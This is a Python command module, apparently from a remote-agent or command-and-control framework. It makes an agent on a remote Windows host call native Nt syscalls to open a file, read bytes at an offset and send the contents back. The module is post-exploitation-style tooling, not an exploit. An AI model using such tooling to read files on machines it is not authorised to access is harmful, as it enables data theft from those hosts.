NAME = "read"
DESCRIPTION = "Read bytes from a file"
PARAMS = [
    {"name":"file_name", "description":"The file name", "type":"str"},
    {"name":"read_size", "description":"Number of bytes to read", "type":"int"},
    {"name":"byte_offset", "description":"Offset to read the file from", "type":"hex"},
]
DEPENDENCIES = ["NtOpenFile", "NtReadFile", "NtClose", "NtAllocateVirtualMemory", "NtFreeVirtualMemory"]

def function(agent_id, args):
    from services.orders import read_from_agent
    from services.binary import align_up


    file_name = "\\??\\" + args[0]
    read_size = args[1]
    buffer_size = align_up(read_size, 0x1000)
    byte_offset = args[2]

    ret = NtAllocateVirtualMemory(agent_id, [buffer_size, 0x04])
    if ret["retval"] == 0:
        buffer_ptr = ret["allocated_memory"]
        print(f"buffer_ptr = {hex(buffer_ptr)}")

        ret = NtOpenFile(agent_id, [file_name, 0xC0100000])
        if ret["retval"] == 0:
            file_handle = ret["FILE_HANDLE"]

            ret = NtReadFile(agent_id, [file_handle, byte_offset, buffer_ptr, read_size])
            if ret["retval"] == 0:
                data = read_from_agent(agent_id, buffer_ptr, read_size)

                retclose = NtClose(agent_id, [file_handle])
                print(f"NtClose = {hex(retclose['retval'])}")

                retfree = NtFreeVirtualMemory(agent_id, [buffer_ptr, buffer_size])
                print(f"NtFreeVirtualMemory = {hex(retfree['retval'])}")
                decoded = data.decode("utf-8", errors="replace")
                return {
                    "Result": "Success",
                    "Data": decoded
                }
            else:
                retclose = NtClose(agent_id, [file_handle])
                print(f"NtClose = {hex(retclose['retval'])}")

                retfree = NtFreeVirtualMemory(agent_id, [buffer_ptr, buffer_size])
                print(f"NtFreeVirtualMemory = {hex(retfree['retval'])}")

                return {"Result": f"Error in NtReadFile: {hex(ret['retval'])}"}
        else:
            retfree = NtFreeVirtualMemory(agent_id, [buffer_ptr, buffer_size])
            print(f"NtFreeVirtualMemory = {hex(retfree['retval'])}")

            return {"Result": f"Error in NtOpenFile: {hex(ret['retval'])}"}
    else:
        return {"Result": "Failed to allocate process memory"}